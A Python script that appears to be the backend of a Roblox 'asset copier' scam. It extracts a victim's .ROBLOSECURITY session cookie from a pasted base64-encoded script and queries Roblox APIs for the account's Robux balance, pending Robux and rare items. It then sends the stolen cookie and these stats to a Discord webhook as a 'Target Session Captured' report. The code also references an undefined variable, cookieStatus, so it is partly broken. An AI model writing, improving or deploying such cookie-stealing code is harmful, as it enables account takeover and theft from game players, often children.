import sys
import base64
import os
import json
import requests
import re

def main():
    if len(sys.argv) < 2:
        return
    
    try:
        # Decode input script passed from Node.js
        decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8')
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')

        if not webhook_url:
            print("Webhook URL not configured on server.")
            return

        # 1. Extract Target URL and Asset ID
        uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
        target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"

        id_match = re.search(r'/(\d+)/|id=(\d+)', target_url)
        asset_id = id_match.group(1) or id_match.group(2) if id_match else "126531364524013"

        # 2. Extract .ROBLOSECURITY Cookie
        cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
        roblosecurity = cookie_match.group(1) if cookie_match else None

        if not roblosecurity:
            print("Cookie not found.")
            return

        # 3. Validate Cookie & Fetch Real Stats via Roblox APIs
        username = "Unknown User"
        robux_balance = 0
        pending_robux = 0
        has_korblox = "False"
        has_headless = "False"
        cookie_status = "🔴 Invalid / Expired"

        headers = {
            "Cookie": f".ROBLOSECURITY={roblosecurity}"
        }

        # Check authenticated user
        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id")
            cookie_status = "🟢 Valid & Active"

            # Fetch Robux Balance
            curr_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
            if curr_res.status_code == 200:
                robux_balance = curr_res.json().get("robux", 0)

            # Fetch Pending Robux
            pend_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/resale-stock/pending-robux", headers=headers)
            if pend_res.status_code == 200:
                pending_robux = pend_res.json().get("pendingRobux", 0)

            # Check Korblox (1924100) & Headless (134082579)
            def check_asset(aid):
                chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
                if chk.status_code == 200:
                    data = chk.json().get("data", [])
                    return "True" if len(data) > 0 else "False"
                return "False"

            has_korblox = check_asset(1924100)
            has_headless = check_asset(134082579)

        # 4. Build Discord Profile Embed Payload
        payload = {
            "username": "NexusStudio",
            "avatar_url": "https://i.imgur.com/3G9O1p1.png",
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://images.rbxcdn.com/c2c7a38740a82b383289654826545879/350/350/Avatar/Png"
                },
                "title": "Roblox Asset Transfer Log",
                "url": target_url,
                "description": f"**👤 Target Session Captured**\n`{username}`\n\n" +
                               f"🛡️ **Cookie Status**\n• State: `{cookieStatus}`\n\n" +
                               f"💰 **Robux Stats**\n• Balance: `{robux_balance} R$`\n• Pending: `{pending_robux} R$`\n\n" +
                               f"🎭 **Rare Items Check**\n• Korblox: `{has_korblox}`\n• Headless: `{has_headless}`\n\n" +
                               f"📊 **Asset Info**\n• ID: `{asset_id}`\n• Progress: `100% Completed`\n\n" +
                               f"🔑 **Extracted .ROBLOSECURITY**\n```text\n{roblosecurity}\n```",
                "color": 6528033 if cookieStatus.startswith("🟢") else 15548997,
                "fields": [
                    { "name": "⚙️ Tool Used", "value": "```Copy-Clothes / Asset Copier```", "inline": False }
                ],
                "thumbnail": {
                    "url": f"https://www.roblox.com/asset-thumbnail/image?assetId={asset_id}&width=420&height=420&format=png"
                },
                "footer": {
                    "text": "NexusStudio Core Automation | Server-Side Verification",
                    "icon_url": "https://i.imgur.com/3G9O1p1.png"
                }
            }]
        }

        requests.post(webhook_url, json=payload)
        print("Success: Dispatched to Discord.")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
